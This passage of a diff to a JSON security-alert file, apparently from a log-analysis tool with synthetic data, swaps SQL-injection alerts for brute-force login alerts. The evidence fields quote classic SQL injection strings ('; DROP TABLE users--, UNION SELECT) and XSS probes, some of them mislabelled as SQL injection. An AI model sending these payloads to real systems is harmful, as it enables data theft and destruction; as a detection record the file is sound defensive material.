-    "severity": "CRITICAL",
-    "description": "SQL injection attempts detected from 221.46.161.241",
+    "timestamp": "2026-02-24T00:08:44.900753",
+    "rule": "Brute Force Attack",
+    "severity": "HIGH",
+    "description": "Detected 15 failed login attempts from 66.165.47.8",
     "evidence": {
-      "source_ip": "221.46.161.241",
-      "attack_count": 1,
-      "sample_paths": [
-        "/comment?text=<img+src=x+onerror=alert('xss')>"
+      "source_ip": "66.165.47.8",
+      "attempt_count": 15,
+      "timestamps": [
+        "2026-02-23T12:32:23+00:00",
+        "2026-02-23T12:32:20+00:00",
+        "2026-02-23T12:32:32+00:00",
+        "2026-02-23T12:32:41+00:00",
+        "2026-02-23T12:32:35+00:00"
       ]
     }
   },
   {
-    "timestamp": "2026-02-21T23:59:34.161353",
-    "rule": "SQL Injection Attempt",
-    "severity": "CRITICAL",
-    "description": "SQL injection attempts detected from 156.224.6.126",
+    "timestamp": "2026-02-24T00:08:44.900830",
+    "rule": "Brute Force Attack",
+    "severity": "HIGH",
+    "description": "Detected 14 failed login attempts from 168.128.135.156",
     "evidence": {
-      "source_ip": "156.224.6.126",
-      "attack_count": 1,
-      "sample_paths": [
-        "/search?q='+UNION+SELECT+NULL--"
+      "source_ip": "168.128.135.156",
+      "attempt_count": 14,
+      "timestamps": [
+        "2026-02-23T11:36:06+00:00",
+        "2026-02-23T11:35:50+00:00",
+        "2026-02-23T11:36:10+00:00",
+        "2026-02-23T11:35:48+00:00",
+        "2026-02-23T11:35:54+00:00"
       ]
     }
   },
   {
-    "timestamp": "2026-02-21T23:59:34.161581",
-    "rule": "SQL Injection Attempt",
-    "severity": "CRITICAL",
-    "description": "SQL injection attempts detected from 40.31.52.56",
+    "timestamp": "2026-02-24T00:08:44.900910",
+    "rule": "Brute Force Attack",
+    "severity": "HIGH",
+    "description": "Detected 18 failed login attempts from 184.102.244.13",
     "evidence": {
-      "source_ip": "40.31.52.56",
-      "attack_count": 1,
-      "sample_paths": [
-        "/comment?text=<script>alert('xss')</script>"
+      "source_ip": "184.102.244.13",
+      "attempt_count": 18,
+      "timestamps": [
+        "2026-02-23T12:08:07+00:00",
+        "2026-02-23T12:08:23+00:00",
+        "2026-02-23T12:08:35+00:00",
+        "2026-02-23T12:08:25+00:00",
+        "2026-02-23T12:08:39+00:00"
       ]
     }
   },
   {
-    "timestamp": "2026-02-21T23:59:34.161695",
-    "rule": "SQL Injection Attempt",
-    "severity": "CRITICAL",
-    "description": "SQL injection attempts detected from 219.187.49.27",
+    "timestamp": "2026-02-24T00:08:44.901019",
+    "rule": "Brute Force Attack",
+    "severity": "HIGH",
+    "description": "Detected 16 failed login attempts from 131.238.188.178",
     "evidence": {
-      "source_ip": "219.187.49.27",
-      "attack_count": 1,
-      "sample_paths": [
-        "/search?q='+OR+'1'='1"
+      "source_ip": "131.238.188.178",
+      "attempt_count": 16,
+      "timestamps": [
+        "2026-02-23T10:53:32+00:00",
+        "2026-02-23T10:53:38+00:00",
+        "2026-02-23T10:53:18+00:00",
+        "2026-02-23T10:53:26+00:00",
+        "2026-02-23T10:53:20+00:00"
       ]
     }
   },
   {
-    "timestamp": "2026-02-21T23:59:34.161856",
-    "rule": "SQL Injection Attempt",
-    "severity": "CRITICAL",
-    "description": "SQL injection attempts detected from 116.234.16.81",
+    "timestamp": "2026-02-24T00:08:44.901105",
+    "rule": "Brute Force Attack",
+    "severity": "HIGH",
+    "description": "Detected 14 failed login attempts from 82.121.200.93",
     "evidence": {
-      "source_ip": "116.234.16.81",
-      "attack_count": 1,
-      "sample_paths": [
-        "/search?q='+UNION+SELECT+NULL--"
+      "source_ip": "82.121.200.93",
+      "attempt_count": 14,
+      "timestamps": [
+        "2026-02-23T10:48:05+00:00",
+        "2026-02-23T10:48:03+00:00",
+        "2026-02-23T10:48:09+00:00",
+        "2026-02-23T10:47:53+00:00",
+        "2026-02-23T10:47:49+00:00"
       ]
     }
   },
   {
-    "timestamp": "2026-02-21T23:59:34.161990",
-    "rule": "SQL Injection Attempt",
-    "severity": "CRITICAL",
-    "description": "SQL injection attempts detected from 162.173.254.61",
+    "timestamp": "2026-02-24T00:08:44.901211",
+    "rule": "Brute Force Attack",
+    "severity": "HIGH",
+    "description": "Detected 18 failed login attempts from 204.182.243.224",
     "evidence": {
-      "source_ip": "162.173.254.61",
-      "attack_count": 1,
-      "sample_paths": [
-        "/comment?text=<iframe+src='javascript:alert(1)'>"
+      "source_ip": "204.182.243.224",
+      "attempt_count": 18,
+      "timestamps": [
+        "2026-02-23T10:45:40+00:00",
+        "2026-02-23T10:45:42+00:00",
+        "2026-02-23T10:45:56+00:00",
+        "2026-02-23T10:45:54+00:00",
+        "2026-02-23T10:46:02+00:00"
       ]
     }
   },
   {
-    "timestamp": "2026-02-21T23:59:34.162117",
-    "rule": "SQL Injection Attempt",
-    "severity": "CRITICAL",
-    "description": "SQL injection attempts detected from 139.170.242.60",
+    "timestamp": "2026-02-24T00:08:44.901287",
+    "rule": "Brute Force Attack",
+    "severity": "HIGH",
+    "description": "Detected 15 failed login attempts from 105.203.94.175",
     "evidence": {
-      "source_ip": "139.170.242.60",
-      "attack_count": 1,
-      "sample_paths": [
-        "/search?q='+UNION+SELECT+NULL--"
+      "source_ip": "105.203.94.175",
+      "attempt_count": 15,
+      "timestamps": [
+        "2026-02-23T12:25:53+00:00",
+        "2026-02-23T12:25:59+00:00",
+        "2026-02-23T12:25:56+00:00",
+        "2026-02-23T12:25:29+00:00",
+        "2026-02-23T12:26:05+00:00"
       ]
     }
   },
   {
-    "timestamp": "2026-02-21T23:59:34.162311",
-    "rule": "SQL Injection Attempt",
-    "severity": "CRITICAL",
-    "description": "SQL injection attempts detected from 36.96.85.154",
+    "timestamp": "2026-02-24T00:08:44.901350",
+    "rule": "Brute Force Attack",
+    "severity": "HIGH",
+    "description": "Detected 20 failed login attempts from 70.51.128.233",
     "evidence": {
-      "source_ip": "36.96.85.154",
-      "attack_count": 1,
-      "sample_paths": [
-        "/search?q='+UNION+SELECT+NULL--"
+      "source_ip": "70.51.128.233",
+      "attempt_count": 20,
+      "timestamps": [
+        "2026-02-23T11:43:27+00:00",
+        "2026-02-23T11:43:25+00:00",
+        "2026-02-23T11:43:09+00:00",
+        "2026-02-23T11:43:21+00:00",
+        "2026-02-23T11:42:59+00:00"
       ]
     }
   },
   {
-    "timestamp": "2026-02-21T23:59:34.162402",
-    "rule": "SQL Injection Attempt",
-    "severity": "CRITICAL",
-    "description": "SQL injection attempts detected from 68.199.7.189",
+    "timestamp": "2026-02-24T00:08:44.901418",
+    "rule": "Brute Force Attack",
+    "severity": "HIGH",
+    "description": "Detected 15 failed login attempts from 162.196.49.163",
     "evidence": {
-      "source_ip": "68.199.7.189",
-      "attack_count": 1,
-      "sample_paths": [
-        "/search?q='+OR+'x'='x"
+      "source_ip": "162.196.49.163",
+      "attempt_count": 15,
+      "timestamps": [
+        "2026-02-23T11:46:09+00:00",
+        "2026-02-23T11:45:27+00:00",
+        "2026-02-23T11:45:33+00:00",
+        "2026-02-23T11:45:51+00:00",
+        "2026-02-23T11:45:54+00:00"
       ]
     }
   },
   {
-    "timestamp": "2026-02-21T23:59:34.162509",
-    "rule": "SQL Injection Attempt",
-    "severity": "CRITICAL",
-    "description": "SQL injection attempts detected from 156.187.165.99",
+    "timestamp": "2026-02-24T00:08:44.901482",
+    "rule": "Brute Force Attack",
+    "severity": "HIGH",
+    "description": "Detected 10 failed login attempts from 123.163.48.200",
     "evidence": {
-      "source_ip": "156.187.165.99",
-      "attack_count": 1,
-      "sample_paths": [
-        "/comment?text=javascript:alert('xss')"
+      "source_ip": "123.163.48.200",
+      "attempt_count": 10,
+      "timestamps": [
+        "2026-02-23T11:30:47+00:00",
+        "2026-02-23T11:30:55+00:00",
+        "2026-02-23T11:30:53+00:00",
+        "2026-02-23T11:30:45+00:00",
+        "2026-02-23T11:30:49+00:00"
       ]
     }
   },
   {
-    "timestamp": "2026-02-21T23:59:34.162595",
-    "rule": "SQL Injection Attempt",
-    "severity": "CRITICAL",
-    "description": "SQL injection attempts detected from 198.130.73.166",
+    "timestamp": "2026-02-24T00:08:44.901550",
+    "rule": "Brute Force Attack",
+    "severity": "HIGH",
+    "description": "Detected 16 failed login attempts from 180.40.59.70",
     "evidence": {
-      "source_ip": "198.130.73.166",
-      "attack_count": 1,
-      "sample_paths": [
-        "/comment?text=<svg/onload=alert('xss')>"
+      "source_ip": "180.40.59.70",
+      "attempt_count": 16,
+      "timestamps": [
+        "2026-02-23T12:28:31+00:00",
+        "2026-02-23T12:28:17+00:00",
+        "2026-02-23T12:28:25+00:00",
+        "2026-02-23T12:28:21+00:00",
+        "2026-02-23T12:28:11+00:00"
       ]
     }
   },
   {
-    "timestamp": "2026-02-21T23:59:34.162804",
-    "rule": "SQL Injection Attempt",
-    "severity": "CRITICAL",
-    "description": "SQL injection attempts detected from 19.209.239.104",
+    "timestamp": "2026-02-24T00:08:44.901618",
+    "rule": "Brute Force Attack",
+    "severity": "HIGH",
+    "description": "Detected 15 failed login attempts from 112.174.10.250",
     "evidence": {
-      "source_ip": "19.209.239.104",
-      "attack_count": 1,
-      "sample_paths": [
-        "/search?q=admin'+--"
+      "source_ip": "112.174.10.250",
+      "attempt_count": 15,
+      "timestamps": [
+        "2026-02-23T12:35:58+00:00",
+        "2026-02-23T12:35:43+00:00",
+        "2026-02-23T12:36:13+00:00",
+        "2026-02-23T12:36:19+00:00",
+        "2026-02-23T12:35:52+00:00"
       ]
     }
   },
   {
-    "timestamp": "2026-02-21T23:59:34.162987",
-    "rule": "SQL Injection Attempt",
-    "severity": "CRITICAL",
-    "description": "SQL injection attempts detected from 192.177.209.181",
+    "timestamp": "2026-02-24T00:08:44.901703",
+    "rule": "Brute Force Attack",
+    "severity": "HIGH",
+    "description": "Detected 12 failed login attempts from 160.77.136.22",
     "evidence": {
-      "source_ip": "192.177.209.181",
-      "attack_count": 1,
-      "sample_paths": [
-        "/search?q=1'+UNION+SELECT+*+FROM+users--"
+      "source_ip": "160.77.136.22",
+      "attempt_count": 12,
+      "timestamps": [
+        "2026-02-23T11:38:13+00:00",
+        "2026-02-23T11:38:19+00:00",
+        "2026-02-23T11:38:25+00:00",
+        "2026-02-23T11:38:15+00:00",
+        "2026-02-23T11:38:31+00:00"
       ]
     }
   },
   {
-    "timestamp": "2026-02-21T23:59:34.163263",
-    "rule": "SQL Injection Attempt",
-    "severity": "CRITICAL",
-    "description": "SQL injection attempts detected from 206.138.52.121",
+    "timestamp": "2026-02-24T00:08:44.901786",
+    "rule": "Brute Force Attack",
+    "severity": "HIGH",
+    "description": "Detected 15 failed login attempts from 219.241.3.135",
     "evidence": {
-      "source_ip": "206.138.52.121",
-      "attack_count": 1,
-      "sample_paths": [
-        "/comment?text=<body+onload=alert('xss')>"
+      "source_ip": "219.241.3.135",
+      "attempt_count": 15,
+      "timestamps": [
+        "2026-02-23T11:55:09+00:00",
+        "2026-02-23T11:55:06+00:00",
+        "2026-02-23T11:55:00+00:00",
+        "2026-02-23T11:55:12+00:00",
+        "2026-02-23T11:54:57+00:00"
       ]
     }
   },
   {
-    "timestamp": "2026-02-21T23:59:34.163560",
-    "rule": "SQL Injection Attempt",
-    "severity": "CRITICAL",
-    "description": "SQL injection attempts detected from 7.205.234.255",
+    "timestamp": "2026-02-24T00:08:44.901892",
+    "rule": "Brute Force Attack",
+    "severity": "HIGH",
+    "description": "Detected 15 failed login attempts from 136.220.132.194",
     "evidence": {
-      "source_ip": "7.205.234.255",
-      "attack_count": 1,
-      "sample_paths": [
-        "/comment?text=javascript:alert('xss')"
+      "source_ip": "136.220.132.194",
+      "attempt_count": 15,
+      "timestamps": [
+        "2026-02-23T12:13:08+00:00",
+        "2026-02-23T12:13:29+00:00",
+        "2026-02-23T12:13:17+00:00",
+        "2026-02-23T12:13:23+00:00",
+        "2026-02-23T12:13:41+00:00"
       ]
     }
   },
   {
-    "timestamp": "2026-02-21T23:59:34.163686",
-    "rule": "SQL Injection Attempt",
-    "severity": "CRITICAL",
-    "description": "SQL injection attempts detected from 56.42.157.61",
+    "timestamp": "2026-02-24T00:08:44.901961",
+    "rule": "Brute Force Attack",
+    "severity": "HIGH",
+    "description": "Detected 15 failed login attempts from 204.102.199.53",
     "evidence": {
-      "source_ip": "56.42.157.61",
-      "attack_count": 1,
-      "sample_paths": [
-        "/search?q=1'+UNION+SELECT+*+FROM+users--"
+      "source_ip": "204.102.199.53",
+      "attempt_count": 15,
+      "timestamps": [
+        "2026-02-23T12:19:11+00:00",
+        "2026-02-23T12:19:02+00:00",
+        "2026-02-23T12:19:05+00:00",
+        "2026-02-23T12:19:32+00:00",
+        "2026-02-23T12:19:08+00:00"
       ]
     }
   },
   {
-    "timestamp": "2026-02-21T23:59:34.163828",
-    "rule": "SQL Injection Attempt",
-    "severity": "CRITICAL",
-    "description": "SQL injection attempts detected from 150.39.56.206",
+    "timestamp": "2026-02-24T00:08:44.902036",
+    "rule": "Brute Force Attack",
+    "severity": "HIGH",
+    "description": "Detected 13 failed login attempts from 38.149.11.112",
     "evidence": {
-      "source_ip": "150.39.56.206",
-      "attack_count": 1,
-      "sample_paths": [
-        "/comment?text=<body+onload=alert('xss')>"
+      "source_ip": "38.149.11.112",
+      "attempt_count": 13,
+      "timestamps": [
+        "2026-02-23T12:07:55+00:00",
+        "2026-02-23T12:07:43+00:00",
+        "2026-02-23T12:08:01+00:00",
+        "2026-02-23T12:07:57+00:00",
+        "2026-02-23T12:07:49+00:00"
       ]
     }
   },
   {
-    "timestamp": "2026-02-21T23:59:34.164061",
-    "rule": "SQL Injection Attempt",
-    "severity": "CRITICAL",
-    "description": "SQL injection attempts detected from 135.73.221.94",
+    "timestamp": "2026-02-24T00:08:44.902127",
+    "rule": "Brute Force Attack",
+    "severity": "HIGH",
+    "description": "Detected 13 failed login attempts from 40.67.235.98",
     "evidence": {
-      "source_ip": "135.73.221.94",
-      "attack_count": 1,
-      "sample_paths": [
-        "/search?q='+OR+'x'='x"
+      "source_ip": "40.67.235.98",
+      "attempt_count": 13,
+      "timestamps": [
+        "2026-02-23T12:42:07+00:00",
+        "2026-02-23T12:42:01+00:00",
+        "2026-02-23T12:41:53+00:00",
+        "2026-02-23T12:42:13+00:00",
+        "2026-02-23T12:41:55+00:00"
       ]
     }
   },
   {
-    "timestamp": "2026-02-21T23:59:34.164178",
-    "rule": "SQL Injection Attempt",
-    "severity": "CRITICAL",
-    "description": "SQL injection attempts detected from 140.161.43.24",
+    "timestamp": "2026-02-24T00:08:44.902200",
+    "rule": "Brute Force Attack",
+    "severity": "HIGH",
+    "description": "Detected 15 failed login attempts from 70.188.21.249",
     "evidence": {
-      "source_ip": "140.161.43.24",
-      "attack_count": 1,
-      "sample_paths": [
-        "/search?q='+OR+'1'='1"
+      "source_ip": "70.188.21.249",
+      "attempt_count": 15,
+      "timestamps": [
+        "2026-02-23T12:11:49+00:00",
+        "2026-02-23T12:11:46+00:00",
+        "2026-02-23T12:11:55+00:00",
+        "2026-02-23T12:11:28+00:00",
+        "2026-02-23T12:11:58+00:00"
       ]
     }
   },
   {
-    "timestamp": "2026-02-21T23:59:34.164428",
-    "rule": "SQL Injection Attempt",
-    "severity": "CRITICAL",
-    "description": "SQL injection attempts detected from 156.145.92.141",
+    "timestamp": "2026-02-24T00:08:44.902267",
+    "rule": "Brute Force Attack",
+    "severity": "HIGH",
+    "description": "Detected 12 failed login attempts from 154.132.116.25",
     "evidence": {
-      "source_ip": "156.145.92.141",
-      "attack_count": 1,
-      "sample_paths": [
-        "/search?q='+OR+'1'='1"
+      "source_ip": "154.132.116.25",
+      "attempt_count": 12,
+      "timestamps": [
+        "2026-02-23T10:53:19+00:00",
+        "2026-02-23T10:53:09+00:00",
+        "2026-02-23T10:53:27+00:00",
+        "2026-02-23T10:53:13+00:00",
+        "2026-02-23T10:53:21+00:00"
       ]
     }
   },
   {
-    "timestamp": "2026-02-21T23:59:34.164591",
-    "rule": "SQL Injection Attempt",
-    "severity": "CRITICAL",
-    "description": "SQL injection attempts detected from 202.223.237.86",
+    "timestamp": "2026-02-24T00:08:44.902327",
+    "rule": "Brute Force Attack",
+    "severity": "HIGH",
+    "description": "Detected 15 failed login attempts from 109.138.93.246",
     "evidence": {
-      "source_ip": "202.223.237.86",
-      "attack_count": 1,
-      "sample_paths": [
-        "/comment?text=<svg/onload=alert('xss')>"
+      "source_ip": "109.138.93.246",
+      "attempt_count": 15,
+      "timestamps": [
+        "2026-02-23T12:37:42+00:00",
+        "2026-02-23T12:38:24+00:00",
+        "2026-02-23T12:38:18+00:00",
+        "2026-02-23T12:38:21+00:00",
+        "2026-02-23T12:38:00+00:00"
       ]
     }
   },
   {
-    "timestamp": "2026-02-21T23:59:34.164771",
+    "timestamp": "2026-02-24T00:08:44.902387",
+    "rule": "Brute Force Attack",
+    "severity": "HIGH",
+    "description": "Detected 13 failed login attempts from 150.185.196.33",
+    "evidence": {
+      "source_ip": "150.185.196.33",
+      "attempt_count": 13,
+      "timestamps": [
+        "2026-02-23T11:23:03+00:00",
+        "2026-02-23T11:23:13+00:00",
+        "2026-02-23T11:22:57+00:00",
+        "2026-02-23T11:23:01+00:00",
+        "2026-02-23T11:22:51+00:00"
+      ]
+    }
+  },
+  {
+    "timestamp": "2026-02-24T00:08:44.902464",
+    "rule": "Brute Force Attack",
+    "severity": "HIGH",
+    "description": "Detected 11 failed login attempts from 42.171.108.121",
+    "evidence": {
+      "source_ip": "42.171.108.121",
+      "attempt_count": 11,
+      "timestamps": [
+        "2026-02-23T12:36:44+00:00",
+        "2026-02-23T12:36:42+00:00",
+        "2026-02-23T12:36:36+00:00",
+        "2026-02-23T12:36:50+00:00",
+        "2026-02-23T12:36:52+00:00"
+      ]
+    }
+  },
+  {
+    "timestamp": "2026-02-24T00:08:44.902561",
+    "rule": "Brute Force Attack",
+    "severity": "HIGH",
+    "description": "Detected 14 failed login attempts from 3.55.20.117",
+    "evidence": {
+      "source_ip": "3.55.20.117",
+      "attempt_count": 14,
+      "timestamps": [
+        "2026-02-23T11:37:54+00:00",
+        "2026-02-23T11:37:44+00:00",
+        "2026-02-23T11:38:02+00:00",
+        "2026-02-23T11:38:10+00:00",
+        "2026-02-23T11:37:46+00:00"
+      ]
+    }
+  },
+  {
+    "timestamp": "2026-02-24T00:08:44.902643",
+    "rule": "Brute Force Attack",
+    "severity": "HIGH",
+    "description": "Detected 15 failed login attempts from 48.25.197.162",
+    "evidence": {
+      "source_ip": "48.25.197.162",
+      "attempt_count": 15,
+      "timestamps": [
+        "2026-02-23T12:12:44+00:00",
+        "2026-02-23T12:12:53+00:00",
+        "2026-02-23T12:12:41+00:00",
+        "2026-02-23T12:12:29+00:00",
+        "2026-02-23T12:12:47+00:00"
+      ]
+    }
+  },
+  {
+    "timestamp": "2026-02-24T00:08:44.902761",
+    "rule": "Brute Force Attack",
+    "severity": "HIGH",
+    "description": "Detected 15 failed login attempts from 183.181.241.20",
+    "evidence": {
+      "source_ip": "183.181.241.20",
+      "attempt_count": 15,
+      "timestamps": [
+        "2026-02-23T11:49:11+00:00",
+        "2026-02-23T11:49:47+00:00",
+        "2026-02-23T11:49:44+00:00",
+        "2026-02-23T11:49:23+00:00",
+        "2026-02-23T11:49:08+00:00"
+      ]
+    }
+  },
+  {
+    "timestamp": "2026-02-24T00:08:44.902841",
+    "rule": "Brute Force Attack",
+    "severity": "HIGH",
+    "description": "Detected 15 failed login attempts from 204.93.223.173",
+    "evidence": {
+      "source_ip": "204.93.223.173",
+      "attempt_count": 15,
+      "timestamps": [
+        "2026-02-23T11:51:14+00:00",
+        "2026-02-23T11:50:44+00:00",
+        "2026-02-23T11:50:59+00:00",
+        "2026-02-23T11:50:56+00:00",
+        "2026-02-23T11:51:02+00:00"
+      ]
+    }
+  },
+  {
+    "timestamp": "2026-02-24T00:08:44.902958",
+    "rule": "Brute Force Attack",
+    "severity": "HIGH",
+    "description": "Detected 10 failed login attempts from 142.9.5.94",
+    "evidence": {
+      "source_ip": "142.9.5.94",
+      "attempt_count": 10,
+      "timestamps": [
+        "2026-02-23T10:56:09+00:00",
+        "2026-02-23T10:56:07+00:00",
+        "2026-02-23T10:56:11+00:00",
+        "2026-02-23T10:56:15+00:00",
+        "2026-02-23T10:56:03+00:00"
+      ]
+    }
+  },
+  {
+    "timestamp": "2026-02-24T00:08:44.903062",
+    "rule": "Brute Force Attack",
+    "severity": "HIGH",
+    "description": "Detected 15 failed login attempts from 179.202.181.248",
+    "evidence": {
+      "source_ip": "179.202.181.248",
+      "attempt_count": 15,
+      "timestamps": [
+        "2026-02-23T12:42:38+00:00",
+        "2026-02-23T12:42:47+00:00",
+        "2026-02-23T12:42:35+00:00",
+        "2026-02-23T12:42:41+00:00",
+        "2026-02-23T12:42:50+00:00"
+      ]
+    }
+  },
+  {
+    "timestamp": "2026-02-24T00:08:44.903138",
+    "rule": "Brute Force Attack",
+    "severity": "HIGH",
+    "description": "Detected 13 failed login attempts from 144.37.76.184",
+    "evidence": {
+      "source_ip": "144.37.76.184",
+      "attempt_count": 13,
+      "timestamps": [
+        "2026-02-23T11:18:54+00:00",
+        "2026-02-23T11:18:58+00:00",
+        "2026-02-23T11:19:12+00:00",
+        "2026-02-23T11:18:52+00:00",
+        "2026-02-23T11:19:02+00:00"
+      ]
+    }
+  },
+  {
+    "timestamp": "2026-02-24T00:08:44.903211",
+    "rule": "Brute Force Attack",
+    "severity": "HIGH",
+    "description": "Detected 10 failed login attempts from 198.44.114.146",
+    "evidence": {
+      "source_ip": "198.44.114.146",
+      "attempt_count": 10,
+      "timestamps": [
+        "2026-02-23T12:38:00+00:00",
+        "2026-02-23T12:38:06+00:00",
+        "2026-02-23T12:38:04+00:00",
+        "2026-02-23T12:37:56+00:00",
+        "2026-02-23T12:38:12+00:00"
+      ]
+    }
+  },
+  {
+    "timestamp": "2026-02-24T00:08:44.925712",
     "rule": "SQL Injection Attempt",
     "severity": "CRITICAL",
-    "description": "SQL injection attempts detected from 82.227.158.235",
+    "description": "SQL injection attempts detected from 93.69.101.229",
     "evidence": {
-      "source_ip": "82.227.158.235",
+      "source_ip": "93.69.101.229",
       "attack_count": 1,
       "sample_paths": [
         "/search?q=';+DROP+TABLE+users--"
@@ -1090,25 +778,12 @@
     }
   },
   {
-    "timestamp": "2026-02-21T23:59:34.165059",
+    "timestamp": "2026-02-24T00:08:44.925846",
     "rule": "SQL Injection Attempt",
     "severity": "CRITICAL",
-    "description": "SQL injection attempts detected from 179.173.60.231",
+    "description": "SQL injection attempts detected from 43.255.206.241",
     "evidence": {
-      "source_ip": "179.173.60.231",
-      "attack_count": 1,
-      "sample_paths": [
-        "/search?q='+OR+'x'='x"
-      ]
-    }
-  },
-  {
-    "timestamp": "2026-02-21T23:59:34.165227",
-    "rule": "SQL Injection Attempt",
-    "severity": "CRITICAL",
-    "description": "SQL injection attempts detected from 11.129.239.156",
-    "evidence": {
-      "source_ip": "11.129.239.156",
+      "source_ip": "43.255.206.241",
       "attack_count": 1,
       "sample_paths": [
         "/search?q='+UNION+SELECT+NULL--"
@@ -1116,220 +791,12 @@
     }
   },
   {
-    "timestamp": "2026-02-21T23:59:34.165300",
+    "timestamp": "2026-02-24T00:08:44.925956",
     "rule": "SQL Injection Attempt",
     "severity": "CRITICAL",
-    "description": "SQL injection attempts detected from 49.230.146.117",
+    "description": "SQL injection attempts detected from 3.34.80.218",
     "evidence": {
-      "source_ip": "49.230.146.117",
-      "attack_count": 1,
-      "sample_paths": [
-        "/search?q='+OR+'x'='x"
-      ]
-    }
-  },
-  {
-    "timestamp": "2026-02-21T23:59:34.165514",
-    "rule": "SQL Injection Attempt",
-    "severity": "CRITICAL",
-    "description": "SQL injection attempts detected from 25.57.235.6",
-    "evidence": {
-      "source_ip": "25.57.235.6",
-      "attack_count": 1,
-      "sample_paths": [
-        "/comment?text=<script>alert('xss')</script>"
-      ]
-    }
-  },
-  {
-    "timestamp": "2026-02-21T23:59:34.165790",
-    "rule": "SQL Injection Attempt",
-    "severity": "CRITICAL",
-    "description": "SQL injection attempts detected from 111.181.51.238",
-    "evidence": {
-      "source_ip": "111.181.51.238",
-      "attack_count": 1,
-      "sample_paths": [
-        "/comment?text=<script>alert('xss')</script>"
-      ]
-    }
-  },
-  {
-    "timestamp": "2026-02-21T23:59:34.166092",
-    "rule": "SQL Injection Attempt",
-    "severity": "CRITICAL",
-    "description": "SQL injection attempts detected from 186.213.210.143",
-    "evidence": {
-      "source_ip": "186.213.210.143",
-      "attack_count": 1,
-      "sample_paths": [
-        "/search?q='+OR+'x'='x"
-      ]
-    }
-  },
-  {
-    "timestamp": "2026-02-21T23:59:34.166340",
-    "rule": "SQL Injection Attempt",
-    "severity": "CRITICAL",
-    "description": "SQL injection attempts detected from 129.46.65.176",
-    "evidence": {
-      "source_ip": "129.46.65.176",
-      "attack_count": 1,
-      "sample_paths": [
-        "/comment?text=<script>alert('xss')</script>"
-      ]
-    }
-  },
-  {
-    "timestamp": "2026-02-21T23:59:34.166630",
-    "rule": "SQL Injection Attempt",
-    "severity": "CRITICAL",
-    "description": "SQL injection attempts detected from 118.127.84.87",
-    "evidence": {
-      "source_ip": "118.127.84.87",
-      "attack_count": 1,
-      "sample_paths": [
-        "/search?q='+OR+'1'='1"
-      ]
-    }
-  },
-  {
-    "timestamp": "2026-02-21T23:59:34.166835",
-    "rule": "SQL Injection Attempt",
-    "severity": "CRITICAL",
-    "description": "SQL injection attempts detected from 117.75.6.20",
-    "evidence": {
-      "source_ip": "117.75.6.20",
-      "attack_count": 1,
-      "sample_paths": [
-        "/search?q='+OR+1=1--"
-      ]
-    }
-  },
-  {
-    "timestamp": "2026-02-21T23:59:34.167005",
-    "rule": "SQL Injection Attempt",
-    "severity": "CRITICAL",
-    "description": "SQL injection attempts detected from 103.137.135.197",
-    "evidence": {
-      "source_ip": "103.137.135.197",
-      "attack_count": 1,
-      "sample_paths": [
-        "/comment?text=<img+src=x+onerror=alert('xss')>"
-      ]
-    }
-  },
-  {
-    "timestamp": "2026-02-21T23:59:34.167187",
-    "rule": "SQL Injection Attempt",
-    "severity": "CRITICAL",
-    "description": "SQL injection attempts detected from 187.157.66.207",
-    "evidence": {
-      "source_ip": "187.157.66.207",
-      "attack_count": 1,
-      "sample_paths": [
-        "/search?q=1'+UNION+SELECT+*+FROM+users--"
-      ]
-    }
-  },
-  {
-    "timestamp": "2026-02-21T23:59:34.167332",
-    "rule": "SQL Injection Attempt",
-    "severity": "CRITICAL",
-    "description": "SQL injection attempts detected from 42.231.127.72",
-    "evidence": {
-      "source_ip": "42.231.127.72",
-      "attack_count": 1,
-      "sample_paths": [
-        "/search?q=1'+AND+'1'='1"
-      ]
-    }
-  },
-  {
-    "timestamp": "2026-02-21T23:59:34.167477",
-    "rule": "SQL Injection Attempt",
-    "severity": "CRITICAL",
-    "description": "SQL injection attempts detected from 144.187.26.97",
-    "evidence": {
-      "source_ip": "144.187.26.97",
-      "attack_count": 1,
-      "sample_paths": [
-        "/comment?text=<img+src=x+onerror=alert('xss')>"
-      ]
-    }
-  },
-  {
-    "timestamp": "2026-02-21T23:59:34.167582",
-    "rule": "SQL Injection Attempt",
-    "severity": "CRITICAL",
-    "description": "SQL injection attempts detected from 150.177.182.96",
-    "evidence": {
-      "source_ip": "150.177.182.96",
-      "attack_count": 1,
-      "sample_paths": [
-        "/comment?text=<svg/onload=alert('xss')>"
-      ]
-    }
-  },
-  {
-    "timestamp": "2026-02-21T23:59:34.167687",
-    "rule": "SQL Injection Attempt",
-    "severity": "CRITICAL",
-    "description": "SQL injection attempts detected from 192.116.246.225",
-    "evidence": {
-      "source_ip": "192.116.246.225",
-      "attack_count": 1,
-      "sample_paths": [
-        "/comment?text=<body+onload=alert('xss')>"
-      ]
-    }
-  },
-  {
-    "timestamp": "2026-02-21T23:59:34.167823",
-    "rule": "SQL Injection Attempt",
-    "severity": "CRITICAL",
-    "description": "SQL injection attempts detected from 172.71.19.121",
-    "evidence": {
-      "source_ip": "172.71.19.121",
-      "attack_count": 1,
-      "sample_paths": [
-        "/search?q=1'+UNION+SELECT+*+FROM+users--"
-      ]
-    }
-  },
-  {
-    "timestamp": "2026-02-21T23:59:34.167935",
-    "rule": "SQL Injection Attempt",
-    "severity": "CRITICAL",
-    "description": "SQL injection attempts detected from 88.10.0.97",
-    "evidence": {
-      "source_ip": "88.10.0.97",
-      "attack_count": 1,
-      "sample_paths": [
-        "/comment?text=<iframe+src='javascript:alert(1)'>"
-      ]
-    }
-  },
-  {
-    "timestamp": "2026-02-21T23:59:34.168040",
-    "rule": "SQL Injection Attempt",
-    "severity": "CRITICAL",
-    "description": "SQL injection attempts detected from 60.100.129.81",
-    "evidence": {
-      "source_ip": "60.100.129.81",
-      "attack_count": 1,
-      "sample_paths": [
-        "/comment?text=<img+src=x+onerror=alert('xss')>"
-      ]
-    }
-  },
-  {
-    "timestamp": "2026-02-21T23:59:34.168145",
-    "rule": "SQL Injection Attempt",
-    "severity": "CRITICAL",
-    "description": "SQL injection attempts detected from 16.74.4.27",
-    "evidence": {
-      "source_ip": "16.74.4.27",
+      "source_ip": "3.34.80.218",
       "attack_count": 1,
       "sample_paths": [
         "/search?q=';+DROP+TABLE+users--"
@@ -1337,38 +804,12 @@
     }
   },
   {
-    "timestamp": "2026-02-21T23:59:34.168250",
+    "timestamp": "2026-02-24T00:08:44.926044",
     "rule": "SQL Injection Attempt",
     "severity": "CRITICAL",
-    "description": "SQL injection attempts detected from 126.18.66.67",
+    "description": "SQL injection attempts detected from 111.147.147.167",
     "evidence": {
-      "source_ip": "126.18.66.67",
-      "attack_count": 1,
-      "sample_paths": [
-        "/search?q='+OR+'x'='x"
-      ]
-    }
-  },
-  {
